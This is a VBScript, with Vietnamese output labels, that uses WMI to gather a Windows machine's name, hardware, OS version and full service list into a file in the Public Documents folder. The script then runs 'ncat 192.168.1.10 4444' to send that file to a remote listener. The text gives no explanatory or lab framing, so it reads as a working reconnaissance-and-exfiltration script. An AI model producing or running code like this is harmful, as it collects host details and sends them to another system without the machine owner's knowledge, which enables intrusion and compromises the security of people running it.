outputFile = "C:\Users\Public\Documents\system_info.txt"

Set fso = CreateObject("Scripting.FileSystemObject")
Set out = fso.CreateTextFile(outputFile, True)

Set wmi = GetObject("winmgmts:\\.\root\cimv2")

out.WriteLine "===== THONG TIN MAY TINH ====="
For Each cs In wmi.ExecQuery("SELECT * FROM Win32_ComputerSystem")
    out.WriteLine "Ten may: " & cs.Name
    out.WriteLine "Nha san xuat: " & cs.Manufacturer
    out.WriteLine "Model: " & cs.Model
    out.WriteLine "Tong RAM (MB): " & Int(cs.TotalPhysicalMemory / 1024 / 1024)
Next

out.WriteLine vbCrLf & "===== HE DIEU HANH ====="
For Each os In wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem")
    out.WriteLine "Ten: " & os.Caption
    out.WriteLine "Version: " & os.Version
    out.WriteLine "Kien truc: " & os.OSArchitecture
    out.WriteLine "Last Boot (raw): " & os.LastBootUpTime
Next

out.WriteLine vbCrLf & "===== DANH SACH SERVICE ====="
For Each svcItem In wmi.ExecQuery("SELECT * FROM Win32_Service")
    out.WriteLine svcItem.Name & " | " & svcItem.DisplayName & " | Trang thai: " & svcItem.State
Next

out.Close


Set s = CreateObject("WScript.Shell")
s.Run "cmd.exe /c ncat 192.168.1.10 4444 < C:\Users\Public\Documents\system_info.txt", 1, True

WScript.Sleep 5000
